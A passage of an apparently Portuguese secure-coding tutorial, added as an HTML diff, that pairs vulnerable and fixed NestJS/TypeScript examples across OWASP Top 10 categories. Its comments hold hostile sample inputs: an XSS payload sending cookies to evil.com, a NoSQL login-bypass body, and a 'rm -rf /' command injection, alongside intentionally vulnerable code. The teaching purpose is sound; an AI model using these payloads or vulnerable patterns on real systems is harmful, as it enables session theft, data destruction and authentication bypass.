+  <span class="kw">const</span> result = <span class="kw">await</span> <span class="kw">this</span>.db.<span class="fn">query</span>(
+    <span class="str">'SELECT * FROM users WHERE name = $1'</span>,
+    [name]
+  );
+  <span class="kw">return</span> result;
+}
+
+<span class="cm">// &#9989; SEGURO — TypeORM com QueryBuilder</span>
+<span class="kw">async</span> <span class="fn">findUsers</span>(name: <span class="tp">string</span>) {
+  <span class="kw">return</span> <span class="kw">this</span>.usersRepo
+    .<span class="fn">createQueryBuilder</span>(<span class="str">'user'</span>)
+    .<span class="fn">where</span>(<span class="str">'user.name = :name'</span>, { name })  <span class="cm">// Parametrizado!</span>
+    .<span class="fn">getMany</span>();
+}</code></pre>
+
+<h4>NoSQL Injection — MongoDB</h4>
+<pre data-lang="typescript"><code><span class="cm">// &#10060; NoSQL INJECTION — Atacante envia objeto ao invés de string</span>
+<span class="cm">// POST /login body: { "email": {"$gt": ""}, "password": {"$gt": ""} }</span>
+<span class="cm">// Resultado: query retorna o primeiro usuário do banco!</span>
+<span class="kw">async</span> <span class="fn">login</span>(email: <span class="tp">any</span>, password: <span class="tp">any</span>) {
+  <span class="kw">return</span> <span class="kw">this</span>.db.<span class="fn">collection</span>(<span class="str">'users'</span>).<span class="fn">findOne</span>({ email, password });
+}
+
+<span class="cm">// &#9989; SEGURO — Validar tipo + sanitizar</span>
+<span class="kw">async</span> <span class="fn">login</span>(dto: <span class="tp">LoginDto</span>) {
+  <span class="cm">// class-válidator garante que email e password são strings</span>
+  <span class="kw">if</span> (<span class="kw">typeof</span> dto.email !== <span class="str">'string'</span> || <span class="kw">typeof</span> dto.password !== <span class="str">'string'</span>) {
+    <span class="kw">throw new</span> <span class="tp">BadRequestException</span>(<span class="str">'Input inválido'</span>);
+  }
+  <span class="kw">const</span> user = <span class="kw">await</span> <span class="kw">this</span>.db.<span class="fn">collection</span>(<span class="str">'users'</span>).<span class="fn">findOne</span>({
+    email: <span class="tp">String</span>(dto.email)  <span class="cm">// Forca string — previne operadores $gt, $ne</span>
+  });
+  <span class="kw">if</span> (!user || !<span class="kw">await</span> <span class="fn">bcrypt.compare</span>(dto.password, user.passwordHash)) {
+    <span class="kw">throw new</span> <span class="tp">UnauthorizedException</span>(<span class="str">'Credenciais inválidas'</span>);
+  }
+  <span class="kw">return</span> user;
+}</code></pre>
+
+<h4>XSS (Cross-Site Scripting)</h4>
+<pre data-lang="typescript"><code><span class="cm">// &#10060; XSS — Renderizando HTML do usuário sem sanitizar</span>
+<span class="cm">// Atacante salva: &lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</span>
+<span class="kw">function</span> <span class="fn">Comment</span>({ text }: { text: <span class="tp">string</span> }) {
+  <span class="kw">return</span> &lt;div dangerouslySetInnerHTML={{ __html: text }} /&gt;;
+}
+
+<span class="cm">// &#9989; SEGURO — React escapa automáticamente (sem dangerouslySetInnerHTML)</span>
+<span class="kw">function</span> <span class="fn">Comment</span>({ text }: { text: <span class="tp">string</span> }) {
+  <span class="kw">return</span> &lt;div&gt;{text}&lt;/div&gt;;  <span class="cm">// React escapa &lt;script&gt; automáticamente</span>
+}
+
+<span class="cm">// &#9989; Se precisar de HTML rico, use sanitização server-side</span>
+<span class="kw">import</span> DOMPurify <span class="kw">from</span> <span class="str">'isomorphic-dompurify'</span>;
+
+<span class="kw">function</span> <span class="fn">RichComment</span>({ html }: { html: <span class="tp">string</span> }) {
+  <span class="kw">const</span> clean = DOMPurify.<span class="fn">sanitize</span>(html, {
+    ALLOWED_TAGS: [<span class="str">'b'</span>, <span class="str">'i'</span>, <span class="str">'em'</span>, <span class="str">'strong'</span>, <span class="str">'a'</span>, <span class="str">'p'</span>],
+    ALLOWED_ATTR: [<span class="str">'href'</span>],
+  });
+  <span class="kw">return</span> &lt;div dangerouslySetInnerHTML={{ __html: clean }} /&gt;;
+}</code></pre>
+
+<h4>Command Injection</h4>
+<pre data-lang="typescript"><code><span class="cm">// &#10060; COMMAND INJECTION — Input do usuário no shell</span>
+<span class="kw">import</span> { exec } <span class="kw">from</span> <span class="str">'child_process'</span>;
+
+<span class="ann">@Post</span>(<span class="str">'convert'</span>)
+<span class="kw">async</span> <span class="fn">convert</span>(<span class="ann">@Body</span>(<span class="str">'filename'</span>) filename: <span class="tp">string</span>) {
+  <span class="cm">// Atacante envia: filename = "file.pdf; rm -rf /"</span>
+  <span class="fn">exec</span>(<span class="str">`convert ${filename} output.png`</span>);
+}
+
+<span class="cm">// &#9989; SEGURO — Use execFile (não passa pelo shell) + validação</span>
+<span class="kw">import</span> { execFile } <span class="kw">from</span> <span class="str">'child_process'</span>;
+<span class="kw">import</span> { basename } <span class="kw">from</span> <span class="str">'path'</span>;
+
+<span class="ann">@Post</span>(<span class="str">'convert'</span>)
+<span class="kw">async</span> <span class="fn">convert</span>(<span class="ann">@Body</span>(<span class="str">'filename'</span>) filename: <span class="tp">string</span>) {
+  <span class="cm">// Sanitiza: só permite nome do arquivo, sem path traversal</span>
+  <span class="kw">const</span> safe = <span class="fn">basename</span>(filename).<span class="fn">replace</span>(<span class="op">/[^a-zA-Z0-9._-]/g</span>, <span class="str">''</span>);
+  <span class="kw">if</span> (!safe.<span class="fn">match</span>(<span class="op">/\.(pdf|doc|txt)$/</span>)) {
+    <span class="kw">throw new</span> <span class="tp">BadRequestException</span>(<span class="str">'Formato inválido'</span>);
+  }
+  <span class="cm">// execFile não invoca shell — argumentos são passados como array</span>
+  <span class="fn">execFile</span>(<span class="str">'convert'</span>, [safe, <span class="str">'output.png'</span>]);
+}</code></pre>
+
+<!-- ═══ A06: INSECURE DESIGN ═══ -->
+<h3>A06: Insecure Design</h3>
+<p>Diferente de bugs de implementação, <strong>insecure design</strong> são falhas <strong>arquiteturais</strong> — o sistema foi desenhado sem considerar cenários de abuso. Nenhuma quantidade de código seguro pode corrigir um design inseguro. A solução e <strong>threat modeling</strong> — pensar em como o sistema pode ser abusado ANTES de escrever código.</p>
+
+<p><strong>Exemplos de design inseguro:</strong></p>
+<ul>
+<li><strong>Password reset sem raté limiting:</strong> Atacante tenta milhares de códigos por segundo</li>
+<li><strong>Checkout sem verificação de preço server-side:</strong> Frontend envia preço — atacante alterá para R$0.01</li>
+<li><strong>Perguntas de segurança:</strong> "Qual o nome do seu pet?" — encontrado fácilmente em redes sociais</li>
+<li><strong>Sem limite de tentativas de login:</strong> Brute force infinito</li>
+</ul>
+
+<h4>Exemplo: Raté Limiting para Login</h4>
+<pre data-lang="typescript"><code><span class="cm">// &#10060; INSECURE DESIGN — Sem limite de tentativas</span>
+<span class="ann">@Post</span>(<span class="str">'auth/login'</span>)
+<span class="kw">async</span> <span class="fn">login</span>(<span class="ann">@Body</span>() dto: <span class="tp">LoginDto</span>) {
+  <span class="kw">const</span> user = <span class="kw">await</span> <span class="kw">this</span>.authService.<span class="fn">válidate</span>(dto.email, dto.password);
+  <span class="kw">if</span> (!user) <span class="kw">throw new</span> <span class="tp">UnauthorizedException</span>();
+  <span class="kw">return</span> <span class="kw">this</span>.authService.<span class="fn">generateToken</span>(user);
+  <span class="cm">// Atacante pode fazer 1 milhão de tentativas sem restricao</span>
+}
+
+<span class="cm">// &#9989; SECURE DESIGN — Raté limiting + account lockout + delay</span>
+<span class="kw">import</span> { Throttle } <span class="kw">from</span> <span class="str">'@nestjs/throttler'</span>;
+
+<span class="ann">@Post</span>(<span class="str">'auth/login'</span>)
+<span class="ann">@Throttle</span>({ default: { limit: <span class="num">5</span>, ttl: <span class="num">60000</span> } })  <span class="cm">// 5 tentativas/minuto por IP</span>
+<span class="kw">async</span> <span class="fn">login</span>(<span class="ann">@Body</span>() dto: <span class="tp">LoginDto</span>, <span class="ann">@Ip</span>() ip: <span class="tp">string</span>) {
+  <span class="cm">// Verifica se conta esta bloqueada</span>
+  <span class="kw">const</span> attempts = <span class="kw">await</span> <span class="kw">this</span>.authService.<span class="fn">getFailedAttempts</span>(dto.email);
+  <span class="kw">if</span> (attempts >= <span class="num">10</span>) {
+    <span class="kw">throw new</span> <span class="tp">ForbiddenException</span>(
+      <span class="str">'Conta bloqueada por excessó de tentativas. Tente em 30 minutos.'</span>
+    );
+  }
+
+  <span class="kw">const</span> user = <span class="kw">await</span> <span class="kw">this</span>.authService.<span class="fn">válidate</span>(dto.email, dto.password);
+  <span class="kw">if</span> (!user) {
+    <span class="kw">await</span> <span class="kw">this</span>.authService.<span class="fn">recordFailedAttempt</span>(dto.email, ip);
+    <span class="cm">// Delay progressivo: 1s, 2s, 4s, 8s... dificulta brute force</span>
+    <span class="kw">await</span> <span class="kw">new</span> <span class="tp">Promise</span>(r => <span class="fn">setTimeout</span>(r, Math.<span class="fn">min</span>(<span class="num">1000</span> * <span class="num">2</span> ** attempts, <span class="num">30000</span>)));
+    <span class="kw">throw new</span> <span class="tp">UnauthorizedException</span>(<span class="str">'Credenciais inválidas'</span>);
+  }
+
+  <span class="kw">await</span> <span class="kw">this</span>.authService.<span class="fn">clearFailedAttempts</span>(dto.email);
+  <span class="kw">return</span> <span class="kw">this</span>.authService.<span class="fn">generateToken</span>(user);
+}</code></pre>
+
+<div class="tip info">
+<span class="tip-icon">i</span>
+<div><strong>Threat Modeling simplificado:</strong> Para cada feature, pergunte: "E se o usuário fizesse isso 10.000 vezes?", "E se enviasse dados inesperados?", "E se manipulasse o request no DevTools?". Se a resposta e "nada de ruim acontece" — ótimo. Se não — redesenhe.</div>
+</div>
+
+<!-- ═══ A07: AUTHENTICATION FAILURES ═══ -->
+<h3>A07: Authentication Failures</h3>
+<p>Falhas na autenticação permitem que atacantes <strong>assumam identidades de outros usuários</strong>. Isso inclui senhas fracas sem validação, credential stuffing (usar credenciais vazadas de outros sites), session fixation, ausência de MFA, e tokens previsíveis.</p>
+
+<div class="card">
+<div class="card-title">Checklist de Autenticação Segura</div>
+<ul>
+<li><strong>Politica de senhas:</strong> Mínimo 8 caracteres, verificar contra listas de senhas vazadas (HaveIBeenPwned API)</li>
+<li><strong>MFA (Multi-Factor Authentication):</strong> TOTP (Google Authenticator) ou WebAuthn/FIDO2 para contas sensíveis</li>
+<li><strong>Session management:</strong> Tokens com expiração curta (15min access, 7d refresh), rotação de refresh tokens</li>
+<li><strong>Credential stuffing defense:</strong> Raté limiting + CAPTCHA após 3 falhas + detecção de IP suspeito</li>
+<li><strong>Logout completo:</strong> Invalidar token server-side (blacklist ou revogação no DB)</li>
+<li><strong>Password reset seguro:</strong> Token com expiração de 15min, single-use, não previsível</li>
+<li><strong>Mensagens genéricas:</strong> "Credenciais inválidas" — nunca "Usuário não encontrado" (evita enumeração)</li>
+<li><strong>Cookies seguros:</strong> <code>httpOnly</code>, <code>secure</code>, <code>sameSite: 'strict'</code>, <code>path: '/'</code></li>
+</ul>
+</div>
+
+<pre data-lang="typescript"><code><span class="cm">// &#9989; Configuração de cookie seguro para JWT (BFF pattern)</span>
+<span class="kw">function</span> <span class="fn">setAuthCookie</span>(res: <span class="tp">Response</span>, token: <span class="tp">string</span>) {
+  res.<span class="fn">cookie</span>(<span class="str">'access_token'</span>, token, {
+    httpOnly: <span class="kw">true</span>,     <span class="cm">// JavaScript não acessa — previne XSS</span>
+    secure: <span class="kw">true</span>,       <span class="cm">// Só envia via HTTPS</span>
+    sameSite: <span class="str">'strict'</span>, <span class="cm">// Previne CSRF</span>
+    maxAge: <span class="num">900000</span>,     <span class="cm">// 15 minutos</span>
+    path: <span class="str">'/'</span>,
+    domain: <span class="str">'.seudomínio.com'</span>,
+  });
+}
+
+<span class="cm">// &#9989; Verificação contra senhas vazadas (HaveIBeenPwned k-Anonymity)</span>
+<span class="kw">import</span> { createHash } <span class="kw">from</span> <span class="str">'crypto'</span>;
+
+<span class="kw">async function</span> <span class="fn">isPasswordBreached</span>(password: <span class="tp">string</span>): <span class="tp">Promise</span>&lt;<span class="tp">boolean</span>&gt; {
+  <span class="kw">const</span> sha1 = <span class="fn">createHash</span>(<span class="str">'sha1'</span>).<span class="fn">update</span>(password).<span class="fn">digest</span>(<span class="str">'hex'</span>).<span class="fn">toUpperCase</span>();
+  <span class="kw">const</span> prefix = sha1.<span class="fn">slice</span>(<span class="num">0</span>, <span class="num">5</span>);
+  <span class="kw">const</span> suffix = sha1.<span class="fn">slice</span>(<span class="num">5</span>);
+
+  <span class="cm">// k-Anonymity: só envia os primeiros 5 chars do hash</span>
+  <span class="kw">const</span> res = <span class="kw">await</span> <span class="fn">fetch</span>(<span class="str">`https://api.pwnedpasswords.com/range/${prefix}`</span>);
+  <span class="kw">const</span> body = <span class="kw">await</span> res.<span class="fn">text</span>();
+
+  <span class="kw">return</span> body.<span class="fn">includes</span>(suffix); <span class="cm">// true = senha já foi vazada</span>
+}</code></pre>
+
+<!-- ═══ A08: SOFTWARE INTEGRITY FAILURES ═══ -->
+<h3>A08: Software Integrity Failures</h3>
+<p>Falhas de integridade ocorrem quando código ou dados são <strong>modificados sem detecção</strong>. Isso inclui updates automáticos sem assinatura, deserialização insegura, e pipelines de CI/CD sem verificação de integridade.</p>
+
+<p><strong>Vetores de ataque:</strong></p>
+<ul>
+<li><strong>CDN hijacking:</strong> Script carregado de CDN e modificado por atacante</li>
+<li><strong>Insecure deserialization:</strong> Objeto serializado maliciosó executa código ao ser deserializado</li>
+<li><strong>Auto-updaté sem assinatura:</strong> App baixa updaté de servidor comprometido</li>
+<li><strong>CI/CD sem verificação:</strong> Pipeline executa código de PR sem review</li>
+</ul>
+
+<h4>SRI (Subresource Integrity) — Proteção contra CDN Hijacking</h4>
+<pre data-lang="html"><code><span class="cm">&lt;!-- &#10060; SEM SRI — Se o CDN for comprometido, script maliciosó executa --&gt;</span>
+&lt;script src=<span class="str">"https://cdn.example.com/lib.js"</span>&gt;&lt;/script&gt;
+
+<span class="cm">&lt;!-- &#9989; COM SRI — Browser verifica hash antes de executar --&gt;</span>
+&lt;script
+  src=<span class="str">"https://cdn.example.com/lib.js"</span>
+  integrity=<span class="str">"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"</span>
+  crossorigin=<span class="str">"anonymous"</span>
+&gt;&lt;/script&gt;
+
+<span class="cm">&lt;!-- Gerar hash SRI via CLI: --&gt;</span>
+<span class="cm">&lt;!-- openssl dgst -sha384 -binary lib.js | openssl base64 -A --&gt;</span></code></pre>
+
+<pre data-lang="typescript"><code><span class="cm">// &#10060; Insecure Deserialization — NUNCA deserialize dados não confiáveis</span>
+<span class="cm">// JSON.parse é seguro para JSON, mas eval() ou unserialize() NÃO são</span>
+
+<span class="cm">// &#10060; PERIGOSO — eval de dados do usuário</span>
+<span class="kw">const</span> data = <span class="fn">eval</span>(<span class="str">'('</span> + userInput + <span class="str">')'</span>);  <span class="cm">// RCE!</span>
+
+<span class="cm">// &#9989; SEGURO — JSON.parse com validação</span>
+<span class="kw">try</span> {
+  <span class="kw">const</span> data = JSON.<span class="fn">parse</span>(userInput);
+  <span class="cm">// Validar schema com zod/class-válidator ANTES de usar</span>
+  <span class="kw">const</span> válidated = schema.<span class="fn">parse</span>(data);
+} <span class="kw">catch</span> {
+  <span class="kw">throw new</span> <span class="tp">BadRequestException</span>(<span class="str">'JSON inválido'</span>);
+}</code></pre>
+
+<!-- ═══ A09: LOGGING & ALERTING FAILURES ═══ -->
+<h3>A09: Logging &amp; Alerting Failures</h3>
+<p>Sem logging adequado, você não sabe que está sendo atacado até que sejá tarde demais. A maioria das brechas de segurança e <strong>detectada meses depois</strong> — frequentemente por terceiros. Logs insuficientes, logs sem alertas, e falta de monitoramento transformam incidentes em catastrofes.</p>
+
+<div class="card purple">
+<div class="card-title">O que você DEVE logar (Security Events)</div>
+<ul>
+<li><strong>Login failures:</strong> Especialmente em sequência (3+ falhas = alerta)</li>
+<li><strong>Login de IP/device desconhecido:</strong> Primeiro acesso de novo pais/dispositivo</li>
+<li><strong>Mudanças de permissão:</strong> Elevação de role, mudança de email/senha</li>
+<li><strong>Acessó negado (403):</strong> Usuário tentando acessar recursó proibido</li>
+<li><strong>Input válidation failures:</strong> Padrões de injection (SQL keywords, <code>&lt;script&gt;</code>)</li>
+<li><strong>Raté limiting triggers:</strong> IP sendo throttled</li>
+<li><strong>CRUD de recursos sensíveis:</strong> Criação/exclusão de API keys, webhooks, configs</li>
+<li><strong>Admin actions:</strong> Tudo que admin faz deve ser auditado</li>
+</ul>
+</div>
+
+<div class="card orange">
+<div class="card-title">O que você NUNCA deve logar</div>
+<ul>
+<li><strong>Senhas</strong> — nem em texto puro, nem hasheadas</li>
+<li><strong>Tokens/API keys</strong> — mascare: <code>sk_live_****abc</code></li>
+<li><strong>Dados de cartao de credito</strong> — PCI-DSS proibe</li>
+<li><strong>Dados pessoais sensíveis</strong> — CPF, números de documentos (LGPD)</li>
+</ul>
+</div>
+
+<h4>Structured Logging — Exemplo com Winston/Pino</h4>
+<pre data-lang="typescript"><code><span class="cm">// &#9989; Logging estruturado para eventos de segurança</span>
+<span class="kw">import</span> { Logger } <span class="kw">from</span> <span class="str">'@nestjs/common'</span>;
+
+<span class="ann">@Injectable</span>()
+<span class="kw">class</span> <span class="tp">SecurityLogger</span> {
+  <span class="kw">private</span> logger = <span class="kw">new</span> <span class="tp">Logger</span>(<span class="str">'Security'</span>);
+
+  <span class="fn">logLoginAttempt</span>(data: {
+    email: <span class="tp">string</span>;
+    success: <span class="tp">boolean</span>;
+    ip: <span class="tp">string</span>;
+    userAgent: <span class="tp">string</span>;
+    reason?: <span class="tp">string</span>;
+  }) {
+    <span class="kw">const</span> log = {
+      event: <span class="str">'LOGIN_ATTEMPT'</span>,
+      email: data.email,
+      success: data.success,
+      ip: data.ip,
+      userAgent: data.userAgent,
+      reason: data.reason,
+      timestamp: <span class="kw">new</span> <span class="tp">Date</span>().<span class="fn">toISOString</span>(),
+    };
+
+    <span class="kw">if</span> (data.success) {
+      <span class="kw">this</span>.logger.<span class="fn">log</span>(JSON.<span class="fn">stringify</span>(log));
+    } <span class="kw">else</span> {
+      <span class="kw">this</span>.logger.<span class="fn">warn</span>(JSON.<span class="fn">stringify</span>(log));
+    }
+  }
+
+  <span class="fn">logAccessDenied</span>(userId: <span class="tp">string</span>, resource: <span class="tp">string</span>, ip: <span class="tp">string</span>) {
+    <span class="kw">this</span>.logger.<span class="fn">warn</span>(JSON.<span class="fn">stringify</span>({
+      event: <span class="str">'ACCESS_DENIED'</span>,
+      userId,
+      resource,
+      ip,
+      timestamp: <span class="kw">new</span> <span class="tp">Date</span>().<span class="fn">toISOString</span>(),
+      <span class="cm">// Alerta automático se 5+ negações em 1 minuto</span>
+    }));
+  }
+
+  <span class="fn">logSuspiciousInput</span>(ip: <span class="tp">string</span>, input: <span class="tp">string</span>, pattern: <span class="tp">string</span>) {
+    <span class="kw">this</span>.logger.<span class="fn">error</span>(JSON.<span class="fn">stringify</span>({
+      event: <span class="str">'SUSPICIOUS_INPUT'</span>,
+      ip,
+      input: input.<span class="fn">substring</span>(<span class="num">0</span>, <span class="num">200</span>),  <span class="cm">// Truncar para evitar log injection</span>
+      detectedPattern: pattern,
+      timestamp: <span class="kw">new</span> <span class="tp">Date</span>().<span class="fn">toISOString</span>(),
+    }));
+  }
+}</code></pre>
+
+<!-- ═══ A10: EXCEPTIONAL CONDITIONS ═══ -->
+<h3>A10: Exceptional Conditions</h3>
+<p>Erros não tratados podem <strong>vazar informações críticas do sistema</strong>: stack traces com paths de arquivo, versões de software, nomes de tabelas do banco, queries SQL completas. Um atacante usa essas informações para refinar seus ataques. A regra é simples: em produção, <strong>nunca exponha detalhes internós ao usuário</strong>.</p>
+
+<h4>Error Handling Middleware — NestJS</h4>
+<pre data-lang="typescript"><code><span class="cm">// &#10060; PERIGOSO — Stack trace exposto ao cliente</span>
+<span class="ann">@Get</span>(<span class="str">'users/:id'</span>)
+<span class="kw">async</span> <span class="fn">getUser</span>(<span class="ann">@Param</span>(<span class="str">'id'</span>) id: <span class="tp">string</span>) {
+  <span class="cm">// Se o DB falhar, NestJS retorna:</span>
+  <span class="cm">// { "statusCode": 500, "message": "QueryFailedError: relation \"users\"</span>
+  <span class="cm">//   does not exist at PostgresQueryRunner.query</span>
+  <span class="cm">//   (/app/node_modules/typeorm/driver/postgres/...:42:19)" }</span>
+  <span class="cm">// Atacante agora sabe: PostgreSQL, TypeORM, path do server</span>
+  <span class="kw">return</span> <span class="kw">this</span>.usersRepo.<span class="fn">findOneByOrFail</span>({ id });
+}
+
+<span class="cm">// &#9989; SEGURO — Exception filter global que sanitiza erros</span>
+<span class="kw">import</span> {
+  <span class="tp">ExceptionFilter</span>, <span class="tp">Catch</span>, <span class="tp">ArgumentsHost</span>, <span class="tp">HttpException</span>, <span class="tp">HttpStatus</span>, <span class="tp">Logger</span>
+} <span class="kw">from</span> <span class="str">'@nestjs/common'</span>;
+
+<span class="ann">@Catch</span>()
+<span class="kw">class</span> <span class="tp">GlobalExceptionFilter</span> <span class="kw">implements</span> <span class="tp">ExceptionFilter</span> {
+  <span class="kw">private</span> logger = <span class="kw">new</span> <span class="tp">Logger</span>(<span class="str">'ExceptionFilter'</span>);
+
+  <span class="fn">catch</span>(exception: <span class="tp">unknown</span>, host: <span class="tp">ArgumentsHost</span>) {
+    <span class="kw">const</span> ctx = host.<span class="fn">switchToHttp</span>();
+    <span class="kw">const</span> response = ctx.<span class="fn">getResponse</span>();
+    <span class="kw">const</span> request = ctx.<span class="fn">getRequest</span>();
+
+    <span class="cm">// Erros HTTP conhecidos (400, 401, 403, 404)</span>
+    <span class="kw">if</span> (exception <span class="kw">instanceof</span> <span class="tp">HttpException</span>) {
+      <span class="kw">const</span> status = exception.<span class="fn">getStatus</span>();
+      <span class="kw">const</span> body = exception.<span class="fn">getResponse</span>();
+      <span class="kw">return</span> response.<span class="fn">status</span>(status).<span class="fn">json</span>(body);
+    }
+
+    <span class="cm">// Erro inesperado — logar detalhes, retornar mensagem genérica</span>
+    <span class="kw">const</span> correlationId = <span class="fn">crypto</span>.<span class="fn">randomUUID</span>();
+
+    <span class="cm">// Log COMPLETO interno (para debugging)</span>
+    <span class="kw">this</span>.logger.<span class="fn">error</span>(JSON.<span class="fn">stringify</span>({
+      correlationId,
+      path: request.url,
+      method: request.method,
+      error: exception <span class="kw">instanceof</span> <span class="tp">Error</span>
+        ? { message: exception.message, stack: exception.stack }
+        : exception,
+      timestamp: <span class="kw">new</span> <span class="tp">Date</span>().<span class="fn">toISOString</span>(),
+    }));
+
+    <span class="cm">// Resposta ao cliente — ZERO detalhes internos</span>
+    response.<span class="fn">status</span>(<span class="tp">HttpStatus</span>.INTERNAL_SERVER_ERROR).<span class="fn">json</span>({
+      statusCode: <span class="num">500</span>,
+      message: <span class="str">'Erro interno do servidor'</span>,
+      correlationId,  <span class="cm">// Permite ao usuário reportar o erro</span>
+    });
+  }
+}
+
+<span class="cm">// Registrar globalmente no main.ts</span>
+app.<span class="fn">useGlobalFilters</span>(<span class="kw">new</span> <span class="tp">GlobalExceptionFilter</span>());</code></pre>
+
+<div class="tip good">
+<span class="tip-icon">&#10022;</span>
+<div><strong>Correlation ID:</strong> Gere um UUID único para cada erro 500. Retorne ao cliente e logue internamente. Quando o usuário reportar "deu erro", você busca o correlationId nós logs e tem todo o contexto sem ter exposto nada ao atacante.</div>
+</div>
+
+<!-- ═══ SECURITY HEADERS COMPLETO ═══ -->
+<h3>Security Headers — Configuração Completa</h3>
+<p>Headers HTTP de segurança são a <strong>primeira linha de defesa</strong> contra ataques do lado do browser. Uma configuração robusta protege contra XSS, clickjacking, MIME sniffing, e downgrades de protocolo — tudo sem mudar uma linha do código da aplicação.</p>
+
+<pre data-lang="typescript"><code><span class="cm">// &#9989; Configuração completa de segurança para NestJS (main.ts)</span>
+<span class="kw">import</span> helmet <span class="kw">from</span> <span class="str">'helmet'</span>;
+<span class="kw">import</span> { <span class="tp">NestFactory</span> } <span class="kw">from</span> <span class="str">'@nestjs/core'</span>;
+<span class="kw">import</span> { <span class="tp">ValidationPipe</span> } <span class="kw">from</span> <span class="str">'@nestjs/common'</span>;
+
+<span class="kw">async function</span> <span class="fn">bootstrap</span>() {
+  <span class="kw">const</span> app = <span class="kw">await</span> <span class="tp">NestFactory</span>.<span class="fn">create</span>(<span class="tp">AppModule</span>);
+
+  <span class="cm">// 1. Security Headers</span>
+  app.<span class="fn">use</span>(<span class="fn">helmet</span>({
+    contentSecurityPolicy: {
+      directives: {
+        defaultSrc: [<span class="str">"'self'"</span>],
+        scriptSrc: [<span class="str">"'self'"</span>],
+        styleSrc: [<span class="str">"'self'"</span>, <span class="str">"'unsafe-inline'"</span>],
+        imgSrc: [<span class="str">"'self'"</span>, <span class="str">'data:'</span>, <span class="str">'https:'</span>],
+        fontSrc: [<span class="str">"'self'"</span>, <span class="str">'https://fonts.gstatic.com'</span>],
+        connectSrc: [<span class="str">"'self'"</span>],
+        frameSrc: [<span class="str">"'none'"</span>],
+        objectSrc: [<span class="str">"'none'"</span>],
+        upgradeInsecureRequests: [],
+      },
+    },
+    hsts: { maxAge: <span class="num">31536000</span>, includeSubDomains: <span class="kw">true</span>, preload: <span class="kw">true</span> },
+    frameguard: { action: <span class="str">'deny'</span> },
+    noSniff: <span class="kw">true</span>,
+    referrerPolicy: { policy: <span class="str">'strict-origin-when-cross-origin'</span> },
+    crossOriginEmbedderPolicy: <span class="kw">true</span>,
+    crossOriginOpenerPolicy: { policy: <span class="str">'same-origin'</span> },
+    crossOriginResourcePolicy: { policy: <span class="str">'same-origin'</span> },
+  }));
+
+  <span class="cm">// 2. CORS restritivo</span>
+  app.<span class="fn">enableCors</span>({
+    origin: process.env.ALLOWED_ORIGINS?.<span class="fn">split</span>(<span class="str">','</span>) || [],
+    credentials: <span class="kw">true</span>,
+    methods: [<span class="str">'GET'</span>, <span class="str">'POST'</span>, <span class="str">'PUT'</span>, <span class="str">'PATCH'</span>, <span class="str">'DELETE'</span>],
+    allowedHeaders: [<span class="str">'Content-Type'</span>, <span class="str">'Authorization'</span>],
+  });
+
+  <span class="cm">// 3. Input válidation global</span>
+  app.<span class="fn">useGlobalPipes</span>(<span class="kw">new</span> <span class="tp">ValidationPipe</span>({
+    whitelist: <span class="kw">true</span>,           <span class="cm">// Remove campos não decorados</span>
+    forbidNonWhitelisted: <span class="kw">true</span>, <span class="cm">// Rejeita campos extras</span>
+    transform: <span class="kw">true</span>,            <span class="cm">// Auto-transforma tipos</span>
+  }));
+
+  <span class="cm">// 4. Global exception filter</span>
+  app.<span class="fn">useGlobalFilters</span>(<span class="kw">new</span> <span class="tp">GlobalExceptionFilter</span>());
+
+  <span class="kw">await</span> app.<span class="fn">listen</span>(process.env.PORT || <span class="num">3000</span>);
+}</code></pre>
+
+<!-- ═══ MINI SYSTEM DESIGN ═══ -->
+<h3>Mini System Design: Security Checklist para uma Nova NestJS API</h3>
+<p><strong>Cenário:</strong> Você está lancando uma nova API NestJS em produção. Projete o checklist de segurança completo cobrindo todas as camadas.</p>
+
+<div class="diagram">
+<div class="diagram-box green">Client<br><small>(Browser/App)</small></div>
+<div class="diagram-arrow">&rarr;</div>
+<div class="diagram-box blue">CDN / WAF<br><small>(CloudFlare/AWS)</small></div>
+<div class="diagram-arrow">&rarr;</div>
+<div class="diagram-box purple">API Gateway<br><small>(Raté Limit)</small></div>
+<div class="diagram-arrow">&rarr;</div>
+<div class="diagram-box orange">NestJS API<br><small>(Auth + Validation)</small></div>
+<div class="diagram-arrow">&rarr;</div>
+<div class="diagram-box red">Database<br><small>(Encrypted)</small></div>
+</div>
+
+<div class="card">
+<div class="card-title">Camada 1 — Transporte e Infraestrutura</div>
+<ul>
+<li><strong>HTTPS obrigatório:</strong> TLS 1.2+ em todos os endpoints. HSTS com preload</li>
+<li><strong>WAF:</strong> CloudFlare ou AWS WAF para filtrar ataques comuns (SQLi, XSS)</li>
+<li><strong>DDoS protection:</strong> Raté limiting na borda (CloudFlare, AWS Shield)</li>
+<li><strong>Environment variables:</strong> Secrets via AWS Secrets Manager ou Vault, NUNCA em .env commitado</li>
+</ul>
+</div>
+
+<div class="card blue">
+<div class="card-title">Camada 2 — Autenticação e Autorização</div>
+<ul>
+<li><strong>JWT em httpOnly cookie:</strong> BFF pattern, access token curto (15min), refresh token longo (7d)</li>
+<li><strong>RBAC ou ABAC:</strong> Guards de role em cada endpoint. Princípio de menor privilégio</li>
+<li><strong>Ownership verification:</strong> Toda query filtrada por userId do token</li>
+<li><strong>MFA:</strong> Para admin e ações críticas (deletar conta, mudar email)</li>
+</ul>
+</div>
+
+<div class="card purple">
+<div class="card-title">Camada 3 — Input Validation e Sanitização</div>
+<ul>
+<li><strong>ValidationPipe global:</strong> whitelist + forbidNonWhitelisted + transform</li>
+<li><strong>class-válidator em DTOs:</strong> @IsString, @IsEmail, @MaxLength em CADA campo</li>
+<li><strong>Parametrized queries:</strong> TypeORM com query parameters, nunca string concatenation</li>
+<li><strong>File upload:</strong> Validar MIME type, tamanho máximo, não confiar na extensão</li>
+</ul>
+</div>
+
+<div class="card orange">
+<div class="card-title">Camada 4 — Raté Limiting e Monitoramento</div>
+<ul>
+<li><strong>@nestjs/throttler:</strong> Raté limit global (100 req/min) + específico para login (5/min)</li>
+<li><strong>Structured logging:</strong> Todos os eventos de segurança em formato JSON</li>
+<li><strong>Alertas:</strong> Slack/PagerDuty para 5+ login failures, 403 patterns, 500 spikes</li>
+<li><strong>Audit trail:</strong> Registro de todas as ações de admin com IP, timestamp, before/after</li>
+</ul>
+</div>
+
+<div class="card">
+<div class="card-title">Camada 5 — Dependency e CI/CD Security</div>
+<ul>
+<li><strong>npm audit:</strong> Executar no CI, falhar build se vulnerabilidade crítica</li>
+<li><strong>Dependabot/Renovate:</strong> PRs automáticas para updates de segurança</li>
